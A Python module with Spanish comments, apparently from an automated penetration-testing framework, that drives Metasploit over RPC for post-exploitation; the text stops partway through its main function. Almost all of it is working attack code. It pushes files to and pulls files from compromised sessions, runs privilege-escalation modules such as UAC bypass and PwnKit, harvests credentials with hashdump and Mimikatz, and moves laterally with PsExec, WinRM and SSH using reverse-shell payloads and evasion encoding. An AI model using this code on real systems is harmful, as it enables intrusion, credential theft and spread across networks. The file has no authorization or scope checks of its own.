#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import argparse
import subprocess
import logging
import random
import time
import re
import base64
from datetime import datetime
from pymetasploit3.msfrpc import MsfRpcClient

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/pentest/temp/post-exploitation.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('post-exploitation')

class PostExploitation:
    def __init__(self, config_file='/opt/pentest/config/post-config.json'):
        """Inicializa el módulo de post-explotación con configuración desde archivo"""
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            logger.error(f"Archivo de configuración no encontrado: {config_file}")
            # Configuración por defecto
            self.config = {
                "timeout": 180,
                "msf_host": "127.0.0.1",
                "msf_port": 55553,
                "msf_user": "msf",
                "msf_pass": "msf",
                "evasion_techniques": ["sleep_delays", "memory_only", "timestomp"],
                "loot_directory": "/opt/pentest/reports/loot",
                "evidence_directory": "/opt/pentest/reports/evidence",
                "cleanup_files": True,
                "max_file_size_mb": 10,
                "post_modules": {
                    "privilege_escalation": True,
                    "credential_harvesting": True,
                    "lateral_movement": True,
                    "persistence": False
                }
            }
        
        # Comprobar si se está ejecutando metasploit RPC
        self.msf_client = None
        self.msf_initialized = False
        self.attempts_to_start_msf = 0
        self.max_attempts = 3
        
        # Crear directorios necesarios
        os.makedirs(self.config.get("loot_directory", "/opt/pentest/reports/loot"), exist_ok=True)
        os.makedirs(self.config.get("evidence_directory", "/opt/pentest/reports/evidence"), exist_ok=True)
    
    def initialize_msf(self):
        """Inicializa la conexión con Metasploit Framework RPC"""
        if self.msf_initialized:
            return True
        
        if self.attempts_to_start_msf >= self.max_attempts:
            logger.error("Número máximo de intentos para iniciar MSF alcanzado")
            return False
        
        try:
            # Intentar conectar con el servicio RPC existente
            self.msf_client = MsfRpcClient(
                self.config.get("msf_pass", "msf"),
                server=self.config.get("msf_host", "127.0.0.1"),
                port=self.config.get("msf_port", 55553),
                ssl=False,
                username=self.config.get("msf_user", "msf")
            )
            
            # Verificar la conexión
            if self.msf_client and hasattr(self.msf_client, 'core'):
                msf_version = self.msf_client.core.version()
                logger.info(f"Conexión establecida con Metasploit Framework: {msf_version}")
                self.msf_initialized = True
                return True
            else:
                raise Exception("Conexión establecida pero API no accesible")
        
        except Exception as e:
            logger.warning(f"Error al conectar con Metasploit RPC: {str(e)}")
            logger.info(f"Intentando iniciar el servicio MSF RPC (intento {self.attempts_to_start_msf + 1})")
            
            # Iniciar el servicio MSF RPC
            try:
                cmd = [
                    "msfrpcd",
                    "-P", self.config.get("msf_pass", "msf"),
                    "-U", self.config.get("msf_user", "msf"),
                    "-a", self.config.get("msf_host", "127.0.0.1"),
                    "-p", str(self.config.get("msf_port", 55553)),
                    "-S", "false"
                ]
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(10)  # Dar tiempo a que inicie
                
                self.attempts_to_start_msf += 1
                return self.initialize_msf()  # Intentar reconectar
            except Exception as e:
                logger.error(f"Error al iniciar servicio MSF RPC: {str(e)}")
                self.attempts_to_start_msf += 1
                return False
    
    def run_command_on_session(self, session_id, command, timeout=30):
        """Ejecuta un comando en una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return None
        
        try:
            # Verificar tipo de sesión
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return None
            
            session = self.msf_client.sessions.session(session_id)
            session_type = sessions[str(session_id)]['type']
            
            result = None
            
            # Ejecutar comando según tipo de sesión
            if session_type == 'meterpreter':
                # Aplicar técnica de evasión si está configurada
                if "sleep_delays" in self.config.get("evasion_techniques", []):
                    delay = random.uniform(1.0, 3.0)
                    logger.debug(f"Aplicando delay de {delay} segundos para evasión")
                    time.sleep(delay)
                
                # Ejecutar comando en meterpreter
                result = session.run_with_output(command, timeout)
            
            elif session_type in ['shell', 'ssh']:
                # Ejecutar comando en shell
                session.write(f"{command}\n")
                
                # Esperar respuesta
                time.sleep(2)  # Dar tiempo a que se ejecute
                
                # Leer resultado
                result = session.read()
                
                # Esperar más tiempo para comandos largos
                attempts = 0
                while "..." in result and attempts < 5:
                    time.sleep(1)
                    result += session.read()
                    attempts += 1
            
            return result
        
        except Exception as e:
            logger.error(f"Error al ejecutar comando en sesión: {str(e)}")
            return None
    
    def upload_file_to_session(self, session_id, local_file, remote_file):
        """Sube un archivo a una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return False
        
        try:
            # Verificar tipo de sesión
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return False
            
            session = self.msf_client.sessions.session(session_id)
            session_type = sessions[str(session_id)]['type']
            
            # Solo meterpreter soporta upload directo
            if session_type == 'meterpreter':
                result = session.run_with_output(f"upload {local_file} {remote_file}")
                return "uploaded" in result.lower()
            
            elif session_type == 'shell':
                # Para shell, codificar archivo en base64 y decodificar en destino
                try:
                    # Leer archivo y codificar
                    with open(local_file, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                    
                    # Comprobar si es sistema Windows o Unix
                    result = self.run_command_on_session(session_id, "uname -a")
                    is_windows = "Windows" in result
                    
                    if is_windows:
                        # En Windows, usar certutil
                        temp_b64 = remote_file + ".b64"
                        
                        # Escribir contenido codificado en archivo temporal
                        for i in range(0, len(file_data), 500):
                            chunk = file_data[i:i+500]
                            echo_cmd = f'echo {chunk} >> {temp_b64}'
                            self.run_command_on_session(session_id, echo_cmd)
                        
                        # Decodificar con certutil
                        decode_cmd = f'certutil -decode {temp_b64} {remote_file}'
                        self.run_command_on_session(session_id, decode_cmd)
                        
                        # Eliminar archivo temporal
                        self.run_command_on_session(session_id, f'del {temp_b64}')
                        
                    else:
                        # En Unix, usar base64
                        temp_b64 = remote_file + ".b64"
                        
                        # Escribir contenido codificado en archivo temporal
                        for i in range(0, len(file_data), 500):
                            chunk = file_data[i:i+500]
                            echo_cmd = f'echo "{chunk}" >> {temp_b64}'
                            self.run_command_on_session(session_id, echo_cmd)
                        
                        # Decodificar con base64
                        decode_cmd = f'base64 -d {temp_b64} > {remote_file}'
                        self.run_command_on_session(session_id, decode_cmd)
                        
                        # Dar permisos de ejecución
                        self.run_command_on_session(session_id, f'chmod +x {remote_file}')
                        
                        # Eliminar archivo temporal
                        self.run_command_on_session(session_id, f'rm {temp_b64}')
                    
                    return True
                
                except Exception as e:
                    logger.error(f"Error al subir archivo a sesión shell: {str(e)}")
                    return False
            
            return False
        
        except Exception as e:
            logger.error(f"Error al subir archivo: {str(e)}")
            return False
    
    def download_file_from_session(self, session_id, remote_file, local_file):
        """Descarga un archivo desde una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return False
        
        try:
            # Verificar tipo de sesión
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return False
            
            session = self.msf_client.sessions.session(session_id)
            session_type = sessions[str(session_id)]['type']
            
            # Solo meterpreter soporta download directo
            if session_type == 'meterpreter':
                result = session.run_with_output(f"download {remote_file} {local_file}")
                return "downloaded" in result.lower()
            
            elif session_type == 'shell':
                # Para shell, codificar archivo en base64 y transferir por consola
                try:
                    # Comprobar si es sistema Windows o Unix
                    result = self.run_command_on_session(session_id, "uname -a")
                    is_windows = "Windows" in result
                    
                    if is_windows:
                        # En Windows, usar certutil para codificar
                        temp_b64 = remote_file + ".b64"
                        encode_cmd = f'certutil -encode {remote_file} {temp_b64}'
                        self.run_command_on_session(session_id, encode_cmd)
                        
                        # Leer archivo codificado
                        cat_cmd = f'type {temp_b64}'
                    else:
                        # En Unix, usar base64
                        cat_cmd = f'base64 {remote_file}'
                    
                    # Leer contenido codificado
                    encoded_data = self.run_command_on_session(session_id, cat_cmd)
                    
                    # Limpiar datos (eliminar líneas de comando, etc.)
                    if is_windows:
                        # Eliminar cabecera y pie de certutil
                        lines = encoded_data.splitlines()
                        clean_lines = []
                        capture = False
                        
                        for line in lines:
                            if "BEGIN CERTIFICATE" in line:
                                capture = True
                                continue
                            elif "END CERTIFICATE" in line:
                                capture = False
                                continue
                            
                            if capture:
                                clean_lines.append(line.strip())
                        
                        encoded_data = "".join(clean_lines)
                    else:
                        # Limpiar salida del comando base64
                        encoded_data = re.sub(r'^.*?\$\s+base64.*$', '', encoded_data, flags=re.MULTILINE)
                        encoded_data = re.sub(r'^.*?\$\s*$', '', encoded_data, flags=re.MULTILINE)
                    
                    # Decodificar y guardar
                    try:
                        decoded_data = base64.b64decode(encoded_data.strip())
                        with open(local_file, 'wb') as f:
                            f.write(decoded_data)
                        
                        # Limpiar archivos temporales en Windows
                        if is_windows:
                            self.run_command_on_session(session_id, f'del {temp_b64}')
                        
                        return True
                    except Exception as e:
                        logger.error(f"Error al decodificar datos: {str(e)}")
                        return False
                
                except Exception as e:
                    logger.error(f"Error al descargar archivo de sesión shell: {str(e)}")
                    return False
            
            return False
        
        except Exception as e:
            logger.error(f"Error al descargar archivo: {str(e)}")
            return False
    
    def run_post_module(self, session_id, module_name, options=None):
        """Ejecuta un módulo post-explotación en una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return None
        
        result = {
            "success": False,
            "output": "",
            "loot": []
        }
        
        try:
            # Crear la consola
            console_id = self.msf_client.consoles.console().get('id')
            
            # Configurar el módulo
            self.msf_client.consoles.console(console_id).write(f"use {module_name}\n")
            time.sleep(1)
            
            # Configurar opción de sesión
            self.msf_client.consoles.console(console_id).write(f"set SESSION {session_id}\n")
            time.sleep(0.5)
            
            # Configurar opciones adicionales
            if options:
                for option, value in options.items():
                    self.msf_client.consoles.console(console_id).write(f"set {option} {value}\n")
                    time.sleep(0.5)
            
            # Aplicar técnicas de evasión
            evasion_techniques = self.config.get("evasion_techniques", [])
            if "sleep_delays" in evasion_techniques:
                delay = random.randint(1, 3)
                self.msf_client.consoles.console(console_id).write(f"set TIMEOUT {delay+10}\n")
                time.sleep(0.5)
            
            # Comprobar las opciones
            self.msf_client.consoles.console(console_id).write("show options\n")
            time.sleep(2)
            options_output = self.msf_client.consoles.console(console_id).read()
            
            # Ejecutar el módulo
            logger.info(f"Ejecutando módulo post-explotación: {module_name}")
            self.msf_client.consoles.console(console_id).write("run\n")
            
            # Esperar a que termine
            timeout = self.config.get("timeout", 180)
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                time.sleep(5)
                output = self.msf_client.consoles.console(console_id).read()
                result["output"] += output
                
                # Verificar si ha terminado
                if ("[+] Post module execution completed" in output or 
                    "[-] Post failed" in output or
                    "[-] Failed:" in output):
                    break
            
            # Verificar resultado
            if "[+] Post module execution completed" in result["output"]:
                result["success"] = True
            
            # Extraer información sobre loot
            loot_matches = re.findall(r"\[\*\] Loot (?:stored|saved) at (.*?)$", result["output"], re.MULTILINE)
            for loot_file in loot_matches:
                result["loot"].append(loot_file.strip())
            
            # Limpiar la consola
            self.msf_client.consoles.destroy(console_id)
        
        except Exception as e:
            logger.error(f"Error al ejecutar módulo post-explotación: {str(e)}")
            result["output"] += f"\nError: {str(e)}"
        
        return result
    
    def perform_privilege_escalation(self, session_id, target_info):
        """Realiza intentos de escalada de privilegios"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return None
        
        result = {
            "success": False,
            "message": "",
            "technique_used": "",
            "elevated_session": None,
            "commands_output": []
        }
        
        try:
            # Verificar tipo de sesión y sistema operativo
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return result
            
            session_info = sessions[str(session_id)]
            platform = session_info.get('platform', '').lower()
            
            # Detectar si ya tenemos privilegios elevados
            privs_check = None
            
            if session_info['type'] == 'meterpreter':
                privs_check = self.run_command_on_session(session_id, "getuid")
                
                if "system" in privs_check.lower() or "root" in privs_check.lower():
                    result["success"] = True
                    result["message"] = f"Ya se tienen privilegios elevados: {privs_check}"
                    return result
            else:
                # Para sesiones shell
                if "windows" in platform:
                    privs_check = self.run_command_on_session(session_id, "whoami")
                    if "system" in privs_check.lower() or "admin" in privs_check.lower():
                        result["success"] = True
                        result["message"] = f"Ya se tienen privilegios elevados: {privs_check}"
                        return result
                else:
                    privs_check = self.run_command_on_session(session_id, "id")
                    if "uid=0" in privs_check:
                        result["success"] = True
                        result["message"] = f"Ya se tienen privilegios elevados: {privs_check}"
                        return result
            
            # Ejecutar herramientas de reconocimiento para escalada
            if "windows" in platform:
                # Usar WinPEAS para reconocimiento
                logger.info(f"Ejecutando WinPEAS en sesión {session_id}")
                
                # Subir WinPEAS a la sesión
                winpeas_path = "/opt/pentest/tools/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat"
                remote_winpeas = "C:\\Windows\\Temp\\wp.bat"
                
                upload_success = self.upload_file_to_session(session_id, winpeas_path, remote_winpeas)
                
                if upload_success:
                    # Ejecutar WinPEAS
                    winpeas_output = self.run_command_on_session(session_id, remote_winpeas, 120)
                    
                    # Guardar salida como evidencia
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_file = f"{self.config.get('evidence_directory')}/winpeas_{session_id}_{timestamp}.txt"
                    
                    with open(output_file, 'w') as f:
                        f.write(winpeas_output)
                    
                    result["commands_output"].append({
                        "command": "winpeas",
                        "output_file": output_file
                    })
                    
                    # Limpiar archivo si está configurado
                    if self.config.get("cleanup_files", True):
                        self.run_command_on_session(session_id, f"del {remote_winpeas}")
                
                # Intentar técnicas de escalada con módulos post
                escalation_modules = [
                    {
                        "module": "post/windows/escalate/bypassuac_fodhelper",
                        "name": "UAC Bypass using FodHelper"
                    },
                    {
                        "module": "post/windows/escalate/getsystem",
                        "name": "GetSystem ejecutivo"
                    },
                    {
                        "module": "post/windows/escalate/ms16_032_secondary_logon_handle_privesc",
                        "name": "MS16-032 Secondary Logon Handle"
                    }
                ]
                
                for module_info in escalation_modules:
                    if result["success"]:
                        break
                    
                    logger.info(f"Intentando escalada con: {module_info['module']}")
                    
                    # Ejecutar módulo de escalada
                    module_result = self.run_post_module(session_id, module_info['module'])
                    
                    # Comprobar resultado
                    if module_result.get("success", False):
                        # Verificar si se obtuvo una nueva sesión
                        if "new session" in module_result.get("output", "").lower():
                            # Buscar ID de la nueva sesión
                            session_match = re.search(r"New session (\d+) created", module_result.get("output", ""))
                            if session_match:
                                new_session_id = session_match.group(1)
                                
                                result["success"] = True
                                result["message"] = f"Privilegios elevados usando {module_info['name']}"
                                result["technique_used"] = module_info['module']
                                result["elevated_session"] = new_session_id
                        else:
                            # Verificar privilegios actuales
                            verify_privs = self.run_command_on_session(session_id, "getuid")
                            
                            if "system" in verify_privs.lower() or "admin" in verify_privs.lower():
                                result["success"] = True
                                result["message"] = f"Privilegios elevados usando {module_info['name']}"
                                result["technique_used"] = module_info['module']
                
            else:  # Linux/Unix
                # Usar LinPEAS para reconocimiento
                logger.info(f"Ejecutando LinPEAS en sesión {session_id}")
                
                # Subir LinPEAS a la sesión
                linpeas_path = "/opt/pentest/tools/PEASS-ng/linPEAS/linpeas.sh"
                remote_linpeas = "/tmp/.lp.sh"
                
                upload_success = self.upload_file_to_session(session_id, linpeas_path, remote_linpeas)
                
                if upload_success:
                    # Ejecutar LinPEAS
                    linpeas_output = self.run_command_on_session(session_id, f"sh {remote_linpeas}", 180)
                    
                    # Guardar salida como evidencia
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_file = f"{self.config.get('evidence_directory')}/linpeas_{session_id}_{timestamp}.txt"
                    
                    with open(output_file, 'w') as f:
                        f.write(linpeas_output)
                    
                    result["commands_output"].append({
                        "command": "linpeas",
                        "output_file": output_file
                    })
                    
                    # Limpiar archivo si está configurado
                    if self.config.get("cleanup_files", True):
                        self.run_command_on_session(session_id, f"rm {remote_linpeas}")
                
                # Intentar técnicas comunes de escalada en Linux
                escalation_commands = [
                    {
                        "name": "SUDO sin contraseña",
                        "cmd": "sudo -l"
                    },
                    {
                        "name": "SUID binarios",
                        "cmd": "find / -perm -u=s -type f 2>/dev/null"
                    },
                    {
                        "name": "Capacidades",
                        "cmd": "getcap -r / 2>/dev/null"
                    },
                    {
                        "name": "Kernel exploits potenciales",
                        "cmd": "uname -a"
                    }
                ]
                
                for cmd_info in escalation_commands:
                    cmd_output = self.run_command_on_session(session_id, cmd_info["cmd"])
                    
                    # Guardar salida
                    result["commands_output"].append({
                        "command": cmd_info["name"],
                        "output": cmd_output
                    })
                
                # Intentar técnicas de escalada con módulos post
                escalation_modules = [
                    {
                        "module": "post/linux/escalate/cve_2021_4034_pwnkit_lpe_pkexec",
                        "name": "CVE-2021-4034 pkexec LPE"
                    },
                    {
                        "module": "post/linux/escalate/docker_daemon_privilege_escalation",
                        "name": "Docker Daemon Privilege Escalation"
                    },
                    {
                        "module": "post/linux/escalate/screen_exploit",
                        "name": "Screen Exploit"
                    }
                ]
                
                for module_info in escalation_modules:
                    if result["success"]:
                        break
                    
                    logger.info(f"Intentando escalada con: {module_info['module']}")
                    
                    # Ejecutar módulo de escalada
                    module_result = self.run_post_module(session_id, module_info['module'])
                    
                    # Comprobar resultado
                    if module_result.get("success", False):
                        # Verificar si se obtuvo una nueva sesión
                        if "new session" in module_result.get("output", "").lower():
                            # Buscar ID de la nueva sesión
                            session_match = re.search(r"New session (\d+) created", module_result.get("output", ""))
                            if session_match:
                                new_session_id = session_match.group(1)
                                
                                result["success"] = True
                                result["message"] = f"Privilegios elevados usando {module_info['name']}"
                                result["technique_used"] = module_info['module']
                                result["elevated_session"] = new_session_id
                        else:
                            # Verificar privilegios actuales
                            verify_privs = self.run_command_on_session(session_id, "id")
                            
                            if "uid=0" in verify_privs:
                                result["success"] = True
                                result["message"] = f"Privilegios elevados usando {module_info['name']}"
                                result["technique_used"] = module_info['module']
        
        except Exception as e:
            logger.error(f"Error en intento de escalada de privilegios: {str(e)}")
            result["message"] = f"Error: {str(e)}"
        
        return result
    
    def harvest_credentials(self, session_id, target_info):
        """Recolecta credenciales del sistema objetivo"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return None
        
        result = {
            "success": False,
            "message": "",
            "credentials_found": [],
            "loot_files": []
        }
        
        try:
            # Verificar tipo de sesión y sistema operativo
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return result
            
            session_info = sessions[str(session_id)]
            platform = session_info.get('platform', '').lower()
            
            # Módulos para recolección de credenciales según plataforma
            cred_modules = []
            
            if "windows" in platform:
                cred_modules = [
                    {
                        "module": "post/windows/gather/credentials/credential_collector",
                        "name": "Windows Credential Collector"
                    },
                    {
                        "module": "post/windows/gather/smart_hashdump",
                        "name": "Smart Hashdump"
                    },
                    {
                        "module": "post/windows/gather/enum_chrome",
                        "name": "Chrome Credentials"
                    },
                    {
                        "module": "post/windows/gather/credentials/mimikatz",
                        "name": "Mimikatz",
                        "options": {"GETSYSTEM": "false"}
                    }
                ]
            else:  # Linux/Unix
                cred_modules = [
                    {
                        "module": "post/linux/gather/hashdump",
                        "name": "Linux Hashdump"
                    },
                    {
                        "module": "post/linux/gather/enum_users_history",
                        "name": "User History"
                    },
                    {
                        "module": "post/linux/gather/enum_configs",
                        "name": "Config Files"
                    },
                    {
                        "module": "post/multi/gather/ssh_creds",
                        "name": "SSH Credentials"
                    }
                ]
            
            # Ejecutar módulos de recolección de credenciales
            for module_info in cred_modules:
                logger.info(f"Ejecutando módulo de recolección: {module_info['module']}")
                
                options = module_info.get("options", {})
                
                # Aplicar técnicas de evasión adicionales
                if "memory_only" in self.config.get("evasion_techniques", []):
                    if "mimikatz" in module_info['module']:
                        options["WRITEDISK"] = "false"
                
                # Ejecutar módulo
                module_result = self.run_post_module(session_id, module_info['module'], options)
                
                # Procesar resultados
                if module_result.get("success", False):
                    # Buscar credenciales en la salida
                    creds_found = []
                    
                    # Patrones de credenciales
                    if "windows" in platform:
                        # Patrones específicos de Windows
                        user_pass_pattern = re.compile(r"Username\s*:\s*(.*?)\s*Password\s*:\s*(.*?)$", re.MULTILINE)
                        hash_pattern = re.compile(r"([^:]+):([0-9]+):([a-fA-F0-9]+):([a-fA-F0-9]+):::")
                        
                        for match in user_pass_pattern.finditer(module_result.get("output", "")):
                            username, password = match.groups()
                            if username.strip() and password.strip():
                                creds_found.append({
                                    "username": username.strip(),
                                    "password": password.strip(),
                                    "type": "plaintext",
                                    "source": module_info['name']
                                })
                        
                        for match in hash_pattern.finditer(module_result.get("output", "")):
                            username, _, lm_hash, nt_hash = match.groups()
                            if username.strip():
                                creds_found.append({
                                    "username": username.strip(),
                                    "hash_lm": lm_hash,
                                    "hash_nt": nt_hash,
                                    "type": "hash",
                                    "source": module_info['name']
                                })
                    else:
                        # Patrones específicos de Linux
                        user_hash_pattern = re.compile(r"([^:]+):([^:]*):([0-9]+):([0-9]+):(.*?):(.*?):(.*?)$")
                        
                        for match in user_hash_pattern.finditer(module_result.get("output", "")):
                            username, password_hash = match.group(1), match.group(2)
                            if username.strip() and password_hash.strip():
                                creds_found.append({
                                    "username": username.strip(),
                                    "hash": password_hash.strip(),
                                    "type": "hash",
                                    "source": module_info['name']
                                })
                    
                    # Añadir credenciales encontradas
                    for cred in creds_found:
                        if cred not in result["credentials_found"]:
                            result["credentials_found"].append(cred)
                    
                    # Añadir archivos de loot
                    for loot_file in module_result.get("loot", []):
                        if loot_file not in result["loot_files"]:
                            result["loot_files"].append(loot_file)
            
            # Comprobar si se encontraron credenciales
            if result["credentials_found"] or result["loot_files"]:
                result["success"] = True
                result["message"] = f"Se encontraron {len(result['credentials_found'])} credenciales y {len(result['loot_files'])} archivos de loot"
            else:
                result["message"] = "No se encontraron credenciales"
        
        except Exception as e:
            logger.error(f"Error en recolección de credenciales: {str(e)}")
            result["message"] = f"Error: {str(e)}"
        
        return result
    
    def perform_lateral_movement(self, session_id, target_info, credentials):
        """Realiza movimiento lateral a otros sistemas en la red"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return None
        
        result = {
            "success": False,
            "message": "",
            "new_targets": [],
            "new_sessions": []
        }
        
        try:
            # 1. Enumerar hosts en la red
            logger.info(f"Enumerando hosts en la red desde sesión {session_id}")
            
            # Verificar tipo de sesión y sistema operativo
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return result
            
            session_info = sessions[str(session_id)]
            platform = session_info.get('platform', '').lower()
            
            # Comandos para enumeración de red según plataforma
            net_enum_output = ""
            
            if "windows" in platform:
                # Windows: usar comando arp y route print
                arp_output = self.run_command_on_session(session_id, "arp -a")
                route_output = self.run_command_on_session(session_id, "route print")
                net_enum_output = arp_output + "\n" + route_output
            else:
                # Linux: usar ip/ifconfig y route
                ip_output = self.run_command_on_session(session_id, "ip addr show 2>/dev/null || ifconfig")
                route_output = self.run_command_on_session(session_id, "ip route 2>/dev/null || route -n")
                arp_output = self.run_command_on_session(session_id, "ip neigh 2>/dev/null || arp -a")
                net_enum_output = ip_output + "\n" + route_output + "\n" + arp_output
            
            # Guardar salida como evidencia
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"{self.config.get('evidence_directory')}/network_enum_{session_id}_{timestamp}.txt"
            
            with open(output_file, 'w') as f:
                f.write(net_enum_output)
            
            # 2. Extraer IPs encontradas
            ip_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
            potential_ips = ip_pattern.findall(net_enum_output)
            
            # Filtrar IPs válidas (excluir locales, broadcast, etc.)
            target_ips = []
            for ip in potential_ips:
                # Excluir IPs especiales
                if (not ip.startswith("127.") and 
                    not ip.startswith("0.") and 
                    not ip.endswith(".0") and 
                    not ip.endswith(".255") and
                    not ip == "255.255.255.255"):
                    target_ips.append(ip)
            
            # Eliminar duplicados
            target_ips = list(set(target_ips))
            
            # Añadir a resultado
            result["new_targets"] = target_ips
            
            logger.info(f"Encontrados {len(target_ips)} potenciales objetivos para movimiento lateral")
            
            # 3. Intentar movimiento lateral con módulos y credenciales encontradas
            if target_ips and credentials:
                # Usar credenciales encontradas para intentar acceso
                for target_ip in target_ips[:5]:  # Limitar a los primeros 5 para evitar sobrecarga
                    logger.info(f"Intentando movimiento lateral a {target_ip}")
                    
                    # Intentar con credenciales recolectadas
                    for cred in credentials:
                        username = cred.get("username", "")
                        password = cred.get("password", "")
                        
                        # Saltar si no hay credenciales útiles
                        if not username:
                            continue
                        
                        # Probar con diferentes servicios
                        lateral_modules = []
                        
                        if "windows" in platform:
                            lateral_modules = [
                                {
                                    "module": "exploit/windows/smb/psexec",
                                    "name": "PSExec",
                                    "options": {
                                        "RHOSTS": target_ip,
                                        "SMBUser": username,
                                        "SMBPass": password if password else "",
                                        "PAYLOAD": "windows/meterpreter/reverse_tcp"
                                    }
                                },
                                {
                                    "module": "exploit/windows/winrm/winrm_script_exec",
                                    "name": "WinRM Script Exec",
                                    "options": {
                                        "RHOSTS": target_ip,
                                        "USERNAME": username,
                                        "PASSWORD": password if password else "",
                                        "PAYLOAD": "windows/meterpreter/reverse_tcp"
                                    }
                                }
                            ]
                        else:
                            lateral_modules = [
                                {
                                    "module": "exploit/multi/ssh/sshexec",
                                    "name": "SSH Exec",
                                    "options": {
                                        "RHOSTS": target_ip,
                                        "USERNAME": username,
                                        "PASSWORD": password if password else "",
                                        "PAYLOAD": "linux/x86/meterpreter/reverse_tcp"
                                    }
                                }
                            ]
                        
                        # Intentar cada módulo
                        for module_info in lateral_modules:
                            if not self.initialize_msf():
                                continue
                            
                            logger.info(f"Intentando {module_info['name']} a {target_ip} con credenciales de {username}")
                            
                            # Crear consola
                            console_id = self.msf_client.consoles.console().get('id')
                            
                            # Configurar módulo
                            self.msf_client.consoles.console(console_id).write(f"use {module_info['module']}\n")
                            time.sleep(1)
                            
                            # Configurar opciones
                            options = module_info['options']
                            
                            # Configurar LHOST y LPORT
                            lport = random.randint(4000, 4500)
                            lhost = self.config.get("lhost", "127.0.0.1")
                            
                            self.msf_client.consoles.console(console_id).write(f"set LHOST {lhost}\n")
                            time.sleep(0.5)
                            self.msf_client.consoles.console(console_id).write(f"set LPORT {lport}\n")
                            time.sleep(0.5)
                            
                            # Configurar otras opciones
                            for option, value in options.items():
                                self.msf_client.consoles.console(console_id).write(f"set {option} {value}\n")
                                time.sleep(0.5)
                            
                            # Aplicar técnicas de evasión
                            if "payload_encoding" in self.config.get("evasion_techniques", []):
                                self.msf_client.consoles.console(console_id).write("set EnableStageEncoding true\n")
                                time.sleep(0.5)
                                self.msf_client.consoles.console(console_id).write("set StageEncoder x86/shikata_ga_nai\n")
                                time.sleep(0.5)
                            
                            # Ejecutar exploit
                            self.msf_client.consoles.console(console_id).write("exploit -z\n")
                            
                            # Esperar resultado
                            start_time = time.time()
                            output = ""
                            
                            while time.time() - start_time < 60:  # 1 minuto máximo
                                time.sleep(5)
                                console_output = self.msf_client.consoles.console(console_id).read()
                                output += console_output
                                
                                # Verificar si hay nuevas sesiones
                                if "session" in console_output.lower() and "opened" in console_output.lower():
                                    # Buscar ID de la nueva sesión
                                    session_match = re.search(r"Session (\d+) created", console_output)
                                    if session_match:
                                        new_session_id = session_match.group(1)
                                        
                                        result["new_sessions"].append({
                                            "session_id": new_session_id,
                                            "target": target_ip,
                                            "method": module_info['name'],
                                            "credentials": {
                                                "username": username,
                                                "password": "***"
                                            }
                                        })
                                        
                                        result["success"] = True
                                        result["message"] = f"Movimiento lateral exitoso a {target_ip}"
                                        break
                                
                                # Verificar si el exploit ha terminado
                                if "exploit completed" in console_output.lower() or "exploit failed" in console_output.lower():
                                    break
                            
                            # Limpiar la consola
                            self.msf_client.consoles.destroy(console_id)
                            
                            # Si ya tenemos éxito con este objetivo, pasar al siguiente
                            if any(s["target"] == target_ip for s in result["new_sessions"]):
                                break
                        
                        # Si ya tenemos éxito con este objetivo, pasar al siguiente
                        if any(s["target"] == target_ip for s in result["new_sessions"]):
                            break
            
            # Actualizar mensaje final
            if result["new_sessions"]:
                result["success"] = True
                result["message"] = f"Movimiento lateral exitoso a {len(result['new_sessions'])} sistemas"
            else:
                result["message"] = f"Se encontraron {len(target_ips)} objetivos pero no se pudo realizar movimiento lateral"
        
        except Exception as e:
            logger.error(f"Error en movimiento lateral: {str(e)}")
            result["message"] = f"Error: {str(e)}"
        
        return result
    
    def execute_post_exploitation(self, session_id, target_info=None, output_file=None):
        """Ejecuta todas las tareas de post-explotación en una sesión"""
        start_time = datetime.now()
        logger.info(f"Iniciando post-explotación en sesión {session_id} a las {start_time.strftime('%H:%M:%S')}")
        
        if not target_info:
            target_info = {}
        
        result = {
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'post_exploitation_info': {
                'duration': None,
                'techniques_used': self.config.get("evasion_techniques", [])
            },
            'privilege_escalation': None,
            'credentials': None,
            'lateral_movement': None,
            'system_info': {},
            'files_collected': []
        }
        
        try:
            # Verificar si la sesión existe
            if not self.initialize_msf():
                logger.error("No se pudo inicializar Metasploit RPC")
                result['post_exploitation_info']['error'] = "Error al inicializar Metasploit RPC"
                return result
            
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                result['post_exploitation_info']['error'] = f"La sesión {session_id} no existe"
                return result
            
            # Obtener información del sistema
            session_info = sessions[str(session_id)]
            platform = session_info.get('platform', '').lower()
            
            # Recopilar información del sistema
